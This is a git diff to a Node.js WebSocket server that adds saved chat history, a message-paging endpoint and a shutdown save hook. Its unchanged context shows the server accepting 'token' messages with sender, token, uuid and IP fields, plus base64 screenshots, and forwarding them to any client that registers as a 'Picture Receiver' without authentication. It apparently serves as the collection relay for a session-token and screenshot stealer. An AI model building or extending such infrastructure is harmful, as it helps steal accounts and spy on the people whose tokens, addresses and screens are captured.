@@ -2,12 +2,16 @@ import http from 'http';
 import express from 'express';
 import { WebSocket, WebSocketServer } from 'ws';
 import crypto from 'crypto';
+import fs from 'fs/promises';
 
 const app = express();
 app.use(express.static("public"));
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
 const wss = new WebSocketServer({ noServer: true });
+
+const MESSAGES_FILE = 'chat_messages.json';
+let chatMessages = [];
 
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
@@ -17,12 +21,32 @@ server.on('upgrade', (request, socket, head) => {
 
 server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
+    loadMessages();
 });
 
 const usersInChat = new Map();
 const pictureReceivers = new Map();
 const messageReceivers = new Map();
 let keepAliveId = null;
+
+async function loadMessages() {
+    try {
+        const data = await fs.readFile(MESSAGES_FILE, 'utf8');
+        chatMessages = JSON.parse(data);
+        console.log('Chat messages loaded from file');
+    } catch (error) {
+        console.log('No existing chat messages file found. Starting with empty chat history.');
+    }
+}
+
+async function saveMessages() {
+    try {
+        await fs.writeFile(MESSAGES_FILE, JSON.stringify(chatMessages), 'utf8');
+        console.log('Chat messages saved to file');
+    } catch (error) {
+        console.error('Error saving chat messages:', error);
+    }
+}
 
 wss.on("connection", (ws) => {
     const userID = crypto.randomUUID();  
@@ -41,7 +65,6 @@ wss.on("connection", (ws) => {
         keepServerAlive();
     }
     
-    // Send current user count to all clients
     broadcastUserCount();
 });
 
@@ -50,29 +73,42 @@ wss.on("close", () => {
         clearInterval(keepAliveId);
         keepAliveId = null;
     }
+    saveMessages();
 });
 
 app.get('/node-version', (req, res) => {
     res.send(`Node.js version: ${process.version}`);
 });
 
+app.get('/api/messages', (req, res) => {
+    const limit = parseInt(req.query.limit) || 50;
+    const offset = parseInt(req.query.offset) || 0;
+    res.json(chatMessages.slice(Math.max(0, chatMessages.length - offset - limit), chatMessages.length - offset).reverse());
+});
+
 const handleMessage = (ws, data, userID) => {
     if (data.toString() === 'Message Receiver') {
         messageReceivers.set(userID, ws);
         console.log(`User ${userID} registered as Message Receiver`);
-        // Send current user count to the new Message Receiver
         ws.send(JSON.stringify({ type: 'userCount', count: usersInChat.size }));
     } else if (data instanceof Buffer) {
-        // Broadcast binary message to all Message Receivers except sender
         broadcastToMessageReceivers(data, ws);
     } else {
         try {
             const messageData = JSON.parse(data.toString());
             
-            if (messageData.command === 'Picture Receiver') {
+            if (messageData.type === 'chat') {
+                const newMessage = {
+                    id: crypto.randomUUID(),
+                    userId: userID,
+                    content: messageData.message,
+                    timestamp: new Date().toISOString()
+                };
+                chatMessages.push(newMessage);
+                broadcastToAllExceptSpecialReceivers(ws, JSON.stringify({ type: 'chat', message: newMessage }), true);
+            } else if (messageData.command === 'Picture Receiver') {
                 pictureReceivers.set(userID, ws);
             } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-                // Broadcast token information only to picture receivers
                 broadcastToPictureReceivers(messageData);
             } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
                 broadcastToPictureReceivers({
@@ -132,8 +168,6 @@ const handleDisconnect = (userID) => {
     pictureReceivers.delete(userID);
     messageReceivers.delete(userID);
     console.log(`User ${userID} disconnected`);
-    
-    // Broadcast updated user count
     broadcastUserCount();
 };
 
@@ -157,3 +191,9 @@ const keepServerAlive = () => {
         });
     }, 30000);
 };
+
+process.on('SIGINT', () => {
+    saveMessages().then(() => {
+        process.exit(0);
+    });
+});
